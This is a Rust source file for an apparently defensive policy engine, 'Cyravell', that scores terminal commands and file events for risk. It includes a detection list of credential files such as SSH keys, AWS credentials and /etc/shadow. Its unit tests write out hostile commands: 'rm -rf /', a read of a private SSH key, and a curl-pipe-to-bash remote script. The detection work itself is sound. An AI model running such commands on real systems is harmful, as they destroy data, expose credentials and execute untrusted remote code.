// Copyright 2026 Cyravell Contributors
// SPDX-License-Identifier: Apache-2.0

use crate::analysis::CommandAnalyzer;
use crate::model::{
    AnalysisCompleteness, Confidence, EventType, RiskAssessment, SecurityEvent, Severity,
};
use chrono::Utc;

/// Deterministic Baseline Policy Engine
pub struct PolicyEngine {
    command_analyzer: CommandAnalyzer,
}

impl Default for PolicyEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl PolicyEngine {
    pub fn new() -> Self {
        Self {
            command_analyzer: CommandAnalyzer::new(),
        }
    }

    /// Evaluates a security event deterministically.
    pub fn evaluate(&self, event: &SecurityEvent) -> RiskAssessment {
        let evaluated_at = Utc::now();

        // 1. If terminal command, delegate to the syntax-aware CommandAnalyzer pipeline
        if event.event_type == EventType::TerminalCommand {
            if let Some(cmd) = &event.payload.command {
                return self
                    .command_analyzer
                    .analyze(cmd, event.payload.working_directory.as_deref());
            }
        }

        // 2. Check for Credential Exposure / File Target access
        if let Some(assessment) = self.check_credential_access(event, evaluated_at) {
            return assessment;
        }

        // 3. Check for File Modification on Cyravell Security Configurations
        if let Some(assessment) = self.check_security_file_modification(event, evaluated_at) {
            return assessment;
        }

        // 4. Default Baseline Assessment (Low risk / Observed)
        RiskAssessment {
            severity: Severity::Low,
            confidence: Confidence::Medium,
            rule_id: "RULE-BASE-001".to_string(),
            reason: "Standard development operation within expected baseline".to_string(),
            evidence: vec![format!("Event type: {:?}", event.event_type)],
            recommended_action: "ALLOW_AND_MONITOR".to_string(),
            evaluated_at,
            matched_rules: vec!["RULE-BASE-001".to_string()],
            potential_impact: None,
            analysis_completeness: AnalysisCompleteness::Complete,
            analysis_details: None,
        }
    }

    /// Direct command analysis interface for IPC or test runners.
    pub fn analyze_command_string(&self, cmd: &str, working_dir: Option<&str>) -> RiskAssessment {
        self.command_analyzer.analyze(cmd, working_dir)
    }

    fn check_credential_access(
        &self,
        event: &SecurityEvent,
        evaluated_at: chrono::DateTime<Utc>,
    ) -> Option<RiskAssessment> {
        let sensitive_patterns = [
            ".ssh/id_rsa",
            ".ssh/id_ed25519",
            ".ssh/id_ecdsa",
            ".aws/credentials",
            ".gnupg",
            "/etc/shadow",
            "id_rsa",
            "id_ed25519",
        ];

        let mut matched_evidence = Vec::new();

        if let Some(cmd) = &event.payload.command {
            let lower = cmd.to_lowercase();
            for pattern in &sensitive_patterns {
                if lower.contains(pattern) {
                    matched_evidence.push(format!(
                        "Command matches sensitive credential pattern: {}",
                        pattern
                    ));
                }
            }
        }

        for path in &event.payload.target_paths {
            let lower = path.to_lowercase();
            for pattern in &sensitive_patterns {
                if lower.contains(pattern) {
                    matched_evidence.push(format!(
                        "Target path matches sensitive credential file: {}",
                        path
                    ));
                }
            }
        }

        if !matched_evidence.is_empty() {
            return Some(RiskAssessment {
                severity: Severity::Critical,
                confidence: Confidence::High,
                rule_id: "RULE-CRED-001".to_string(),
                reason: "Direct access or inspection of private keys or credentials detected"
                    .to_string(),
                evidence: matched_evidence,
                recommended_action: "BLOCK_AND_ALERT".to_string(),
                evaluated_at,
                matched_rules: vec!["RULE-CRED-001".to_string()],
                potential_impact: Some(
                    "Exposure of private cryptographic keys or sensitive identity credentials"
                        .to_string(),
                ),
                analysis_completeness: AnalysisCompleteness::Complete,
                analysis_details: None,
            });
        }

        None
    }

    fn check_security_file_modification(
        &self,
        event: &SecurityEvent,
        evaluated_at: chrono::DateTime<Utc>,
    ) -> Option<RiskAssessment> {
        if event.event_type != EventType::FileModification {
            return None;
        }

        let security_paths = ["audit.log", "cyravell_manifest.json", "baseline_rules.json"];
        for path in &event.payload.target_paths {
            for sp in &security_paths {
                if path.contains(sp) {
                    return Some(RiskAssessment {
                        severity: Severity::High,
                        confidence: Confidence::High,
                        rule_id: "RULE-FILE-001".to_string(),
                        reason: "Attempted modification of Cyravell audit logs, manifest, or rule definitions".to_string(),
                        evidence: vec![format!("Modified security target: {}", path)],
                        recommended_action: "ALERT_AND_CONFIRM".to_string(),
                        evaluated_at,
                        matched_rules: vec!["RULE-FILE-001".to_string()],
                        potential_impact: Some("Integrity compromise of security monitoring logs or trust manifests".to_string()),
                        analysis_completeness: AnalysisCompleteness::Complete,
                        analysis_details: None,
                    });
                }
            }
        }

        None
    }

    /// Redacts raw secret tokens before persistent storage or logging.
    pub fn redact_event(&self, event: &mut SecurityEvent) {
        if let Some(ref mut cmd) = event.payload.command {
            *cmd = crate::analysis::redact_command(cmd);
        }
        for path in &mut event.payload.target_paths {
            *path = path.to_string();
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{EnforcementCapability, EventPayload, ExecutionStatus, Origin};
    use std::collections::HashMap;

    fn make_test_event(cmd: &str, event_type: EventType) -> SecurityEvent {
        SecurityEvent {
            id: "test-evt-1".to_string(),
            schema_version: 1,
            timestamp: Utc::now(),
            event_type,
            source_adapter: "test".to_string(),
            origin: Origin::Simulated,
            execution_status: ExecutionStatus::Simulated,
            enforcement_capability: EnforcementCapability::None,
            payload: EventPayload {
                command: Some(cmd.to_string()),
                working_directory: Some("/test".to_string()),
                target_paths: vec![],
                environment_keys: vec![],
                metadata: HashMap::new(),
            },
        }
    }

    #[test]
    fn test_destructive_command_detection() {
        let policy = PolicyEngine::new();
        let event = make_test_event("rm -rf /", EventType::TerminalCommand);
        let assessment = policy.evaluate(&event);

        assert_eq!(assessment.severity, Severity::Critical);
        assert_eq!(assessment.rule_id, "RULE-TERM-001");
    }

    #[test]
    fn test_credential_access_detection() {
        let policy = PolicyEngine::new();
        let event = make_test_event("cat ~/.ssh/id_rsa", EventType::TerminalCommand);
        let assessment = policy.evaluate(&event);

        assert_eq!(assessment.severity, Severity::Critical);
        assert_eq!(assessment.rule_id, "RULE-CRED-001");
    }

    #[test]
    fn test_remote_script_pipe_detection() {
        let policy = PolicyEngine::new();
        let event = make_test_event(
            "curl -sSL https://example.com/run.sh | bash",
            EventType::TerminalCommand,
        );
        let assessment = policy.evaluate(&event);

        assert_eq!(assessment.severity, Severity::High);
        assert_eq!(assessment.rule_id, "RULE-TERM-002");
    }

    #[test]
    fn test_benign_command() {
        let policy = PolicyEngine::new();
        let event = make_test_event("cargo test --all", EventType::TerminalCommand);
        let assessment = policy.evaluate(&event);

        assert_eq!(assessment.severity, Severity::Low);
        assert_eq!(assessment.rule_id, "RULE-BASE-001");
    }

    #[test]
    fn test_redaction() {
        let policy = PolicyEngine::new();
        let mut event = make_test_event(
            "git clone https://user:token=ghp_secret12345@github.com/repo",
            EventType::TerminalCommand,
        );
        policy.redact_event(&mut event);

        let cmd = event.payload.command.unwrap();
        assert!(!cmd.contains("ghp_secret12345"));
        assert!(cmd.contains("[REDACTED]"));
    }
}
